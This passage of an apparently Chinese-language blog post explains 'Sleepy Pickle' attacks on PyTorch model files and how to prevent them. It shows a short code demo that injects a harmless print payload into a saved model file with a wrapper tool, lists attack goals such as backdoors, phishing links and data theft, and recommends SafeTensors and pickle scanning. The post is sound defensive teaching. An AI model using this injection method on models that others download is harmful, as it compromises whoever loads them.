+torch<span class="token punctuation">.</span>save<span class="token punctuation">(</span>model<span class="token punctuation">,</span> <span class="token string">"mobilenet.pth"</span><span class="token punctuation">)</span>
+
+result <span class="token operator">=</span> PyTorchModelWrapper<span class="token punctuation">(</span><span class="token string">"mobilenet.pth"</span><span class="token punctuation">)</span>
+
+temp_filename <span class="token operator">=</span> <span class="token string">"temp_filename.pt"</span>
+result<span class="token punctuation">.</span>inject_payload<span class="token punctuation">(</span>
+    <span class="token string">"print('Inject successful!')"</span><span class="token punctuation">,</span>
+    temp_filename<span class="token punctuation">,</span>
+    injection<span class="token operator">=</span><span class="token string">"insertion"</span><span class="token punctuation">,</span>
+    overwrite<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
+<span class="token punctuation">)</span>
+
+<span class="token comment"># Load file with injected payload</span>
+torch<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">"mobilenet.pth"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>輸出：</p>
+<p><img src="/./assets/image-1.png" alt="alt text"></p>
+<p>在 Hugging face 上在目前常出現的是<code>pytorch_model.bin</code><br><img src="/./assets/image-3.png" alt="alt text"></p>
+<p>pytorch_model.bin是使用PyTorch中的torch.save 函數所生成的二進位檔案，裡面會存 weights, biases, 或者其他parameters，如果將它unzip會有一個data.pkl可以利用(會依照Pytorch不同的版本裡面會包含不同的檔案)</p>
+<p>!!! info</p>
+<pre><code>* PyTorch v0.1.1: Tar file with sys_info, pickle, storages, and tensors
+* PyTorch v0.1.10: Stacked pickle files
+* TorchScript v1.0: ZIP file with model.json
+* TorchScript v1.1: ZIP file with model.json and attributes.pkl
+* TorchScript v1.3: ZIP file with data.pkl and constants.pkl
+* TorchScript v1.4: ZIP file with data.pkl, constants.pkl, and version set at 2 or higher (2 pickle files and a folder)
+* PyTorch v1.3: ZIP file containing data.pkl (1 pickle file)
+* PyTorch model archive format[ZIP]: ZIP file that includes Python code files and pickle files
+</code></pre>
+<p><img src="/./assets/image-4.png" alt="alt text"></p>
+<p>!!! warning “PyTorch適用版本”<br>    PyTorch &lt;2.6 在最新 2.6版本中，Pytorch 將 torch.load 的參數weights_only預設為True</p>
+<pre><code>&gt; Also in this release as an important security improvement measure we have changed the default value for weights_only parameter of torch.load. This is a backward compatibility-breaking change, please see this forum post for more details.
+</code></pre>
+<p>接下來Hacker 會先透過中間人攻擊、供應鏈攻擊、社交工程等手法，將惡意Pickle檔案傳送至受害者的系統，一旦反序列化後有可能會進行以下的惡意攻擊</p>
+<ul>
+<li>修改模型參數</li>
+</ul>
+<p>可以去微調模型的參數讓他輸出出誤導性或有惡意的輸出</p>
+<p>如：<a target="_blank" rel="noopener" href="https://rome.baulab.info/">ROME</a></p>
+<p><img src="/./assets/image6.png" alt="alt text"></p>
+<ul>
+<li>釣魚</li>
+</ul>
+<p>可以在每次問答時插入惡意的連結<br><img src="/./assets/image-5.png" alt="alt text"></p>
+<ul>
+<li>埋後門</li>
+<li>XSS</li>
+<li>竊取使用者資料</li>
+<li>竄改資料</li>
+<li>…</li>
+</ul>
+<hr>
+<h2 id="🦾How-To-Prevent"><a href="#🦾How-To-Prevent" class="headerlink" title="🦾How To Prevent"></a>🦾How To Prevent</h2><ul>
+<li>不要使用Pickle，使用 SafeTensors.</li>
+<li>如果一定要使用Pickle，需要使用fickling對pickle進行掃描或者限制unpickler</li>
+</ul>
+<hr>
+<h2 id="📚Reference"><a href="#📚Reference" class="headerlink" title="📚Reference"></a>📚Reference</h2><ul>
+<li><p><a target="_blank" rel="noopener" href="https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/">Exploiting ML models with pickle file attacks: Part 1</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-2/">Exploiting ML models with pickle file attacks: Part 2</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.trailofbits.com/2021/03/15/never-a-dill-moment-exploiting-machine-learning-pickle-files/">Never a dill moment: Exploiting machine learning pickle files</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://thesisapi.lib.nycu.edu.tw/server/api/core/bitstreams/affc3d4c-9f19-429a-b392-ce8420d7351b/content">Pain Pickle: 繞過 Python 中受限制的 Unpickler 之自動化脅迫生成</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.ithome.com.tw/news/163545">研究人員揭露針對機器學習模型而來的攻擊手法Sleepy Pickle</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1069">Pickle反序列化</a></p>
+</li>
+</ul>
+
+            <div class="post-tags">
+              <!-- 文章tags -->
+              
+                
+                  <cosy-label href="/tags/Pickle/" size="sm"># Pickle</cosy-label>
+                  
+                  <cosy-label href="/tags/Python/" size="sm"># Python</cosy-label>
+                  
+                  <cosy-label href="/tags/Deserialization/" size="sm"># Deserialization</cosy-label>
+                  
+                    
+            </div>
+        </article>
+        <!-- 评论 -->
+        <div id="vcomments"></div>
+        <div id="tcomment"></div>
+      </div>
+    </main>
+    <!-- toc -->
+    
+      <cosy-drag-box id="toc-drag-box" trigger="left" min-width="220" uid="toc-box">
+        <div class="meta-container">
+          <div class="toc-wrapper cosy-scrollbar">
+            <cosy-tooltip placement="right">
+              <p class="catalog">
+                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24">
+                  <g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M4 6h16"></path>
+                    <path d="M4 12h16"></path>
+                    <path d="M4 18h12"></path>
+                  </g>
+                </svg>
+                <span>Catalog</span>
+              </p>
+              <span slot="content">
+                <span>Hide Table of Contents</span>
+                <cosy-short-key>]</cosy-short-key>
+              </span>
+            </cosy-tooltip>
+            <!-- 文章toc -->
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%F0%9F%92%A4%F0%9F%A5%92Sleeply-Pickle"><span class="toc-number">1.</span> <span class="toc-text">💤🥒Sleeply Pickle</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%99%BB%EF%B8%8F%E5%BA%8F%E5%88%97%E5%8C%96-Serialization-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Deserialization"><span class="toc-number">1.1.</span> <span class="toc-text">♻️序列化(Serialization)&#x2F;反序列化(Deserialization)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A5%92-What-is-Pickle"><span class="toc-number">1.2.</span> <span class="toc-text">🥒 What is Pickle?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9A%A0%EF%B8%8FWhat%E2%80%99s-Wrong-with-Pickle"><span class="toc-number">1.3.</span> <span class="toc-text">⚠️What’s Wrong with Pickle ?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%92%A4Sleepy-Pickle"><span class="toc-number">1.4.</span> <span class="toc-text">💤Sleepy Pickle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A6%BEHow-To-Prevent"><span class="toc-number">1.5.</span> <span class="toc-text">🦾How To Prevent</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%9AReference"><span class="toc-number">1.6.</span> <span class="toc-text">📚Reference</span></a></li></ol></li></ol>
+          </div>
+        </div>
+      </cosy-drag-box>
+      
+  </div>
+
+</div>
+
+<script>
+  window.page = {
+    use: ''
+  }
+  window.katex = {
+    enable: "",
+    jsCdn: "//cdn.jsdelivr.net/npm/katex@0.13.18/dist/katex.min.js",
+    cssCdn: "//cdn.jsdelivr.net/npm/katex@0.13.18/dist/katex.min.css"
+  }
+  window.mermaid = {
+    enable: "",
+    theme: "",
+    cdn: "//cdn.jsdelivr.net/npm/mermaid@10.4.0/dist/mermaid.min.js",
+  }
+  window.valine = {
+    enable: "",
+    appId: 'yourValineAppId',
+    appKey: 'yourValineAppKey',
+    avatar: 'monsterid',
+    cdn: '//unpkg.com/valine@latest/dist/Valine.min.js',
+    serverURLs: ''
+  };
+  window.twikoo = {
+    enable: "",
+    envId: "yourTwikooEnvId",
+    cdn: 'https://cdn.staticfile.org/twikoo/1.6.32/twikoo.all.min.js',
+    lang: 'zh-CN',
+  }
+</script>
+
+
+<script src="/js/8f5fa89f.js"></script>
+
+  </main>
+</body>
+
+<script>
+  window.theme = {
+    color: 'hsl(238,50%,56%)'
+  }
+</script>
+
+
+<script src="/js/e5a59732.js"></script>
+
+
+</html>
